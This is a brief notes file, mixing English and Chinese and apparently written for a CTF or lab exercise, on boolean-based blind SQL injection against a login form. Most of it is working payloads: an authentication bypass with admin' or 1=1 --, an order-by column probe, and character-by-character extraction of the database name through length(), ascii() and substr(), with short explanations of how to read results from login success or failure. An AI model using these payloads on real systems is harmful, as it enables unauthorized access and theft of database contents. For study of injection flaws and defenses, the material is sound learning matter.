# sql

username: admin' or 1=1 -- 
can login, but nothing happen, needs to get data in database

但是没有可以回显的地方，只能通过表达式，比如说
admin' or 1=1 order by 1--
正确的话就依旧登录成更，否则就是密码错误（判断无效）

username=admin' and length(database())>25 -- &password=fff
由于知道了用户名的确是admin, 所以用的and, 否则直接用or就好，可以出来数据库的大小

username=admin' and ascii(substr((select database()),1,1))=116
通过ascii可以
username=admin' and ascii(substr((select database()),1,1))>100

username=admin' and substr((select database()),1,1)='t' -- &password=fff

